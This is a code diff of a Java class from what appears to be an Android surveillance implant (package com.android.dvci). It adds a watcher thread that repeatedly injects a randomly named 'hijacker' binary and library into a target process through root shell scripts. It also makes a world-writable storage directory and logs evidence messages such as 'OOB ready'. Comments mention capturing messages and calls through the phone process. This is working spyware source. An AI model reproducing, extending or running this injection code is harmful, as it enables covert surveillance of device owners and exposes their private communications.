@@ -6,6 +6,7 @@ import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.mm.M;
 
 import java.io.File;
@@ -17,27 +18,28 @@ import java.util.concurrent.TimeUnit;
 /*
  * todo: migliorare l'inserimento dell'instrumentation, gestione degli stati e degli errori
  */
-public class Instrument {
+public class Instrument implements Runnable{
 	private static final String TAG = "Instrument";
 	private static final int MAX_KILLED = 5;
 	private String proc_owner = null;
 	private String dex_dest = null;
 	private String proc;
 	private PidMonitor pidMonitor;
-	private String lib_dest, hijacker, path, dumpPath, pidCompletePath, pidFile, dexFile, libInAsset;
-
+	private String lib_dest, hijacker, path, dumpPath, dexFile, libInAsset;
+	private static String storage = "";
 	private Semaphore sync_semaphore =null;
 	private Thread monitor;
 	private int killed = 0;
 	private int restartedCounter = 0;
 	private boolean started = false;
 	private String instrumentationSuccessDir = null;
-	private String lid = M.e(" lid ");
+	private boolean watcherContinue = false;
+	private boolean threadRunning = false;
+	private Thread thread = null;
 
 
-	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String owner) {
+	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
 		final File filesPath = Status.getAppContext().getFilesDir();
-
 		proc = process;
 		proc_owner = owner;
 		hijacker = String.valueOf(Math.abs((int)Utils.getRandom()))+"m";
@@ -45,30 +47,50 @@ public class Instrument {
 		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
-		pidFile = _pidFile;
-		pidCompletePath = path + "/" + pidFile;
 		sync_semaphore = sem;
 	}
-	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String _dexFile,String owner) {
-		this(process,dump,_pidFile,sem,library,owner);
-		dexFile = _dexFile;
-		dex_dest = "d"+dexFile.hashCode()+".dex";
-
-
+	public Instrument(String process, String dump,Semaphore sem,String library,String _dexFile,String owner) {
+		this(process,dump,sem,library,owner);
+		if(dex_dest!=null) {
+			dexFile = _dexFile;
+			dex_dest = "d" + dexFile.hashCode() + ".dex";
+		}
 	}
 
-	public Instrument(String process, String dump, String _pidFile, Semaphore sem, String library) {
-		this(process,dump,_pidFile,sem,library,null);
+	public Instrument(String process, String dump, Semaphore sem, String library) {
+		this(process,dump,sem,library,null);
 	}
 
 	public String getInstrumentationSuccessDir() {
-		return instrumentationSuccessDir;
+		return instrumentationSuccessDir+"/";
 	}
 
-	public void setInstrumentationSuccessDir(String instrumentationSuccessDir) {
-		this.instrumentationSuccessDir = instrumentationSuccessDir;
+	public void setInstrumentationSuccessDir(String storageDirName,boolean autoCreate) {
+		this.instrumentationSuccessDir = storageDirName;
+		if(autoCreate) {
+			createMsgStorage();
+		}
 	}
 
+	public boolean createMsgStorage() {
+		// Create storage directory
+
+		if (Path.createDirectory(this.instrumentationSuccessDir) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
+			}
+
+			return false;
+		} else {
+			Execute.chmod(M.e("777"), this.instrumentationSuccessDir);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + this.instrumentationSuccessDir); //$NON-NLS-1$
+			}
+
+			return true;
+		}
+	}
 	public boolean isStarted() {
 		return started;
 	}
@@ -109,7 +131,7 @@ public class Instrument {
 			Execute.chmod(M.e("666"), path + "/" + lib_dest);
 			Execute.chmod(M.e("750"), path + "/" + hijacker);
 			if(getInstrumentationSuccessDir()== null) {
-				setInstrumentationSuccessDir(dumpPath);
+				setInstrumentationSuccessDir(dumpPath,true);
 			}
 
 		} catch (Exception e) {
@@ -182,14 +204,27 @@ public class Instrument {
 						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
 						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + "\n";
-						if( StringUtils.isEmpty(dexFile)) {
-							script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + " -f " + dumpPath + "\n";
-						}else{
-							script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + " -f " + dumpPath +dex_dest + "\n";
+
+						String farg =" ";
+						if( !StringUtils.isEmpty(dumpPath)) {
+							farg += "-f " + dumpPath;
+							if ( !StringUtils.isEmpty(dexFile)) {
+								farg += dex_dest + "\n";
+							}
 						}
+						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + farg ;
+						if (Cfg.DEBUG) {
+							script += " -d ";
+						}
+						script += "\n";
 						Root.createScript(scriptName, script);
 						ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
 						if (Cfg.DEBUG) {
+							Check.log(TAG + " (startInstrumentation) "+proc+" output: ");
+							for( String s : ret.stdout )
+							{
+								Check.log(TAG + s);
+							}
 							Check.log(TAG + " (startInstrumentation) "+proc+" exit code: " + ret.exitCode);
 						}
 
@@ -319,36 +354,7 @@ public class Instrument {
 
 	private int getProcessPid(String process,String proc_owner) {
 		int pid = -1;
-		/*
-		byte[] buf = new byte[4];
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getProcessPid) " + process + " " + pidCompletePath);
-		}
-		Execute.execute(Configuration.shellFile + lid + process + " " + pidCompletePath);
-
-		try {
-			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);
-
-			fis.read(buf);
-			fis.close();
-
-			// Remove PID file
-			File f = new File(pidCompletePath);
-			f.delete();
-
-			// Parse PID from the file
-			ByteBuffer bbuf = ByteBuffer.wrap(buf);
-			bbuf.order(ByteOrder.LITTLE_ENDIAN);
-			pid = bbuf.getInt();
-		} catch (IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			return 0;
-		}
-		*/
-		String pid_s = Utils.pidOf(process,proc_owner);
+		String pid_s = Utils.pidOf(process, proc_owner);
 		if(pid_s != null){
 			try{
 				pid = Integer.valueOf(pid_s);
@@ -414,6 +420,154 @@ public class Instrument {
 	public void setRestartCounter(int counter) {
 		restartedCounter = counter;
 	}
+
+	/**
+	 * Indicates if the main thread is running
+	 * @return threadRunning
+	 */
+
+	public synchronized boolean isThreadRunning() {
+		return threadRunning ;
+	}
+
+	public synchronized void setThreadRunning(boolean threadRunning) {
+		this.threadRunning = threadRunning;
+	}
+
+	public void stop() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
+		}
+		if( Status.haveRoot() && this.thread != null) {
+			watcherContinue = false;
+			Date start = new Date();
+			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+			while (diff_sec < 60) {
+				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+				try {
+					this.thread.join(500);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): join return ts="+ this.thread.getState()); //$NON-NLS-1$
+					}
+					if(this.thread.getState() == Thread.State.TERMINATED) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
+						}
+						this.thread = null;
+							if (isStarted()) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+								}
+								stopInstrumentation();
+							}
+						break;
+					}
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): failed to join thread"); //$NON-NLS-1$
+					}
+				}
+				Utils.sleep(500);
+			}
+			if(isThreadRunning()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
+				}
+				EvidenceBuilder.info(M.e("OOB failed to stop"));
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
+				}
+				EvidenceBuilder.info(M.e("OOB correctly stopped"));
+
+			}
+		}
+	}
+	@Override
+	public void run() {
+		setThreadRunning(true);
+		while(watcherContinue ) {
+			if (Status.haveRoot()) {
+				if (! isStarted()) {
+					startInjection();
+				}else {
+					checkProcessMonitor(false);
+				}
+			}
+			if(killed>=MAX_KILLED){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(run): too many kill stopping..");
+					watcherContinue = false ;
+				}
+			}
+			Utils.sleep(5000);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(run): asked to stop");
+		}
+		try {
+			stopInstrumentation();
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(run): failed to stopInstrumentation");
+			}
+		}
+		setThreadRunning(false);
+	}
+
+
+	public void start() {
+
+		if (isThreadRunning()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(start): thread ALREADY running");
+			}
+		} else {
+			watcherContinue = true;
+			if (thread == null) {
+				thread = new Thread(this);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(start): starting thread");
+			}
+			thread.start();
+		}
+	}
+
+	public  boolean startInjection() {
+		/*
+		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
+		 * in case the process is killed while used?
+		 */
+		if(killed < MAX_KILLED) {
+			stopInstrumentation();
+			if (isStarted()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker already running");
+				}
+				return true;
+			}
+			if (startInstrumentation()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker successfully installed");
+				}
+				EvidenceBuilder.info(M.e("OOB ready"));
+				return true;
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker cannot be installed");
+				}
+				EvidenceBuilder.info(M.e("OOB cannot be installed"));
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker cannot be installed too many trials");
+			}
+			EvidenceBuilder.info(M.e("OOB cannot be installed,too many trials"));
+		}
+		return false;
+	}
+
 
 	class PidMonitor implements Runnable {
 		private int cur_pid, start_pid;
